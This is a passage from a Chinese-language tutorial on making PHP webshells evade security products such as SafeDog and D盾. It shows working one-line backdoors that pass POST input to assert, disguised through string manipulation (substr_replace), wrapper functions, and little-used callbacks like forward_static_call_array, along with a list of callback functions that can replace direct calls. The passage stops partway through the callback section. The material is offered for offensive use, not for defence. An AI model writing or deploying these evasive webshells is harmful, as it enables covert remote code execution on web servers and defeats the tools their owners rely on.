# 0x01 前言
尽最大努力在一文中让大家掌握一些有用的WEBSHELL免杀技巧

# 0x02 目录
0. 关于eval 于 assert
1. 字符串变形
2. 定义函数绕过
3. 回调函数
4. 回调函数变形
5. 特殊字符干扰
6. 数组
7. 类
8. 编码绕过
9. PHP7.1后webshell何去何从

# 0x03 关于eval 于 assert

关于eval函数在php给出的官方说明是
>eval 是一个语言构造器而不是一个函数，不能被 可变函数 调用
可变函数：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号()，让系统认为该值是一个函数，从而当做函数来执行
通俗的说比如你 `<?php $a=eval;$a() ?>` 这样是不行的 也造就了用eval的话达不到assert的灵活，但是在php7.1以上assert已经不行

关于assert函数
>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！

# 0x04 字符串变形
字符串变形多数用于BYPASS安全狗，相当对于D盾，安全狗更加重视"形"
一个特殊的变形就能绕过安全狗，看看PHP手册，有着很多关于操作字符串的函数

```
ucwords() //函数把字符串中每个单词的首字符转换为大写。
ucfirst() //函数把字符串中的首字符转换为大写。
trim() //函数从字符串的两端删除空白字符和其他预定义字符。
substr_replace() //函数把字符串的一部分替换为另一个字符串
substr() //函数返回字符串的一部分。
strtr() //函数转换字符串中特定的字符。
strtoupper() //函数把字符串转换为大写。
strtolower() //函数把字符串转换为小写。
strtok() //函数把字符串分割为更小的字符串
str_rot13() //函数对字符串执行 ROT13 编码。

```

由于PHP的灵活性操作字符串的函数很多，我这里就不一一列举了

用`substr_replace()` 函数变形assert 达到免杀的效果

```
<?php

$a = substr_replace("assexx","rt",4);

$a($_POST['x']);

?>

```


其他函数类似 不一一列举了

# 0x05 定义函数绕过
定义一个函数把关键词分割达到bypass效果

```
<?php 
function kdog($a){
    $a($_POST['x']);
}
kdog(assert);
?>
```

反之

```
<?php 
function kdog($a){
    assert($a);
}
kdog($_POST[x]);
?>

```

效果一样，这种绕过方法，对安全狗还是比较有效的 在d盾面前就显得小儿科了 ，不过后面会讲到如何用定义函数的方法来 绕过d盾


# 0x05 回调函数

```
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
registregister_shutdown_function()
register_tick_function()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
array_reduce()
array_walk() 
array_walk_recursive()
```

回调函数大部分已经被安全软件加入全家桶套餐 所以找到一个生僻的不常用的回调函数来执行 比如

```
<?php 
forward_static_call_array(assert,array($_POST[x]));
?>
```
